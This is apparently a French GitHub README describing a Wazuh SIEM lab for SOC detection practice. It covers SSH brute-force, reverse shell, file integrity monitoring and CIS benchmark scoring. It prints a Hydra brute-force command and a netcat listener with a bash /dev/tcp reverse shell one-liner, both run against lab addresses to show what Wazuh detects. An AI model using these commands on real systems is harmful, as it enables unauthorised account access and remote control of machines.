<img width="1038" height="708" alt="image" src="https://github.com/user-attachments/assets/515b6d8f-c15b-4358-a5f5-a513843a8acc" />**Wazuh SIEM – IT/OT Security Lab** 
**Projet complet de supervision, détection d’attaques et analyse SOC**
**Auteur : Dexter Mekemlong Roland**


  **1. Objectif du projet**
Construire un environnement IT/OT complet permettant :

- la supervision centralisée via **Wazuh SIEM**  
- la détection d’attaques réelles (brute-force, reverse shell, FIM)  
- l’analyse MITRE ATT&CK  
- la gestion des vulnérabilités  
- l’évaluation de conformité (CIS Benchmark)  
- l’apprentissage des workflows SOC niveau 1/2  

<img width="1340" height="677" alt="image" src="https://github.com/user-attachments/assets/c63de5c5-4bf8-4e37-92d7-4f7b1662f64b" />

Ce projet démontre des compétences **réelles**, **pratiques**, **opérationnelles** en cybersécurité.

 **2. Architecture du Lab IT/OT**
      

**3. Technologies utilisées**
- **Wazuh Manager / Indexer / Dashboard**
- **pfSense** (segmentation IT/OT)
- **Debian 13**, **Kali Linux**, **Windows Server 2022**
- **Netcat**, **Hydra**, **OpenSSH**
- **MITRE ATT&CK**
- **CIS Benchmark**
- **File Integrity Monitoring (FIM)**


 **4. Cas d’usage SOC**

 **4.1. Brute-force SSH → Compromission réussie**
**Objectif :** simuler une attaque brute-force réelle.

**Commande Hydra**:
```
hydra -l dexter -P /usr/share/wordlists/rockyou.txt -t 1 -W 3 ssh://192.168.100.11
```
<img width="741" height="327" alt="image" src="https://github.com/user-attachments/assets/a465560d-b672-4bfa-b8c7-7f0a92b3cc6d" />

Mot de passe trouvé : `dexter`  
Compromission du compte utilisateur  
Wazuh détecte :

- Rule 5710 – SSH authentication failed  
- Rule 5712 – Multiple SSH authentication failures  
- Rule 5720 – Possible brute-force attack  
- Rule 5503 – Successful SSH login  
- MITRE : **T1110 (Brute Force)**, **T1078 (Valid Accounts)**  

---

**4.2. Reverse Shell Root**
**Objectif :** simuler une compromission complète.

Sur Kali :

nc -lvnp 4444
 Sur Debian compromis :
---
bash -i >& /dev/tcp/192.168.100.12/4444 0>&1
---
<img width="732" height="32" alt="image" src="https://github.com/user-attachments/assets/6bf89b40-0970-4086-ad92-aae411710716" />

Shell root obtenu  
 Wazuh détecte :
<img width="732" height="183" alt="image" src="https://github.com/user-attachments/assets/d1d64ee6-1fc5-49a3-9bf8-60a8b8e3f67d" />
- activité shell suspecte  
- exécution de commandes  
- MITRE : **T1059 (Command Execution)**  

---

 **4.3. File Integrity Monitoring (FIM)**

 Exemple :

/etc/resolv.conf — modified — Rule 550 — Level 7


 Wazuh détecte immédiatement la modification  
 Preuve de surveillance en temps réel

---

 **4.4. Vulnérabilités & CIS Benchmark**
Wazuh détecte :

- **48 critiques**
- **413 hautes**
- **402 moyennes**
- **Score CIS : 32%**

 Analyse complète de l’exposition du système  
Recommandations de durcissement

---

**5. Résultats & Analyse SOC**
Ce lab permet :

- d’identifier les attaques  
- de corréler les événements  
- d’analyser les logs  
- de comprendre les tactiques MITRE  
- de proposer des mesures correctives  

Ce projet démontre une capacité à travailler comme **analyste SOC**, **technicien cybersécurité**, ou **IT/OT security engineer**.

---

 **6. Compétences démontrées**
- SIEM (Wazuh)  
- Analyse d’incidents  
- MITRE ATT&CK  
- Segmentation réseau  
- Linux / Windows Security  
- FIM  
- Reverse shell  
- Brute-force detection  
- CIS Benchmark  
- Troubleshooting avancé  

---<img width="1356" height="696" alt="image" src="https://github.com/user-attachments/assets/8e874068-7edf-4005-b63d-36b664967901" />
<img width="1341" height="737" alt="image" src="https://github.com/user-attachments/assets/8a7b8c1f-ba0e-4401-9629-68f71cf41c62" />
<img width="1362" height="697" alt="image" src="https://github.com/user-attachments/assets/ab46332f-4db6-4c2a-a0fe-0312181b18d9" />



 **7. Améliorations futures**
- Intégration Zabbix  
- Ajout d’un honeypot  
- Détection réseau (Suricata)  
- Automatisation via Ansible  

---





